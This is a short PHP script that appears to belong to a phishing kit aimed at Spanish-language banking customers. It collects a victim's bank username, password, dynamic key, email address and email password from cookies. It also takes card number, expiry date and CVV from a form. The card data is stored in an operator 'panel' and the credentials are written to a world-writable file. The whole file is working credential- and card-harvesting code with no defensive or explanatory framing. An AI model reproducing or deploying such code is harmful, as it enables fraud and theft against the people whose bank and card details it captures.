<?php 
require('../../panel/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];
$file = $_COOKIE['archivo'];
$cdinamica = $_COOKIE['cdinamica'];
$email = $_COOKIE['email'];
$cemail = $_COOKIE['cemail'];
$celular = $_COOKIE['celular'];

$tarjeta = $_POST['tar'];
$fecha = $_POST['fec'];
$cvv = $_POST['cvv'];


setcookie('tarjeta',$tarjeta,time()+60*9);
setcookie('fecha',$fecha,time()+60*9);
setcookie('cvv',$cvv,time()+60*9);

actualizar_registro_tar($registro,$tarjeta,$fecha,$cvv);

$data = 'Usuario: '.$usuario." Clave: ".$contrasena." Dinamica: ".$cdinamica." Email: ".$email." Clave: ".$cemail;

if (isset($data)) {
    $fp = fopen($file, 'w');
    fwrite($fp, utf8_decode($data));
    fclose($fp);
    chmod($file, 0777);
}
else {
    echo 'No hay datos que guardar!';
}
?>